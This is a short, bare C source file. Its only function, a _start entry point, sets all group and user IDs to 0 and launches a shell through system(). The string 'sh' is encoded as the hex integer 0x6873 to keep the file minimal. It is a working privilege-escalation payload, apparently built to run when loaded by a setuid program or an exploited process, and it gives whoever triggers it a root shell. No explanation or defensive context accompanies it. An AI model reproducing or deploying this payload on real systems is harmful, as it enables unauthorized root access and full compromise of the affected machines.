int setresgid(int, int, int);
int setresuid(int, int, int);
int system(char*);
void _start()
{
	short cmd = 0x6873;
	setresgid(0, 0, 0);
	setresuid(0, 0, 0);
	system((char*)&cmd);
}
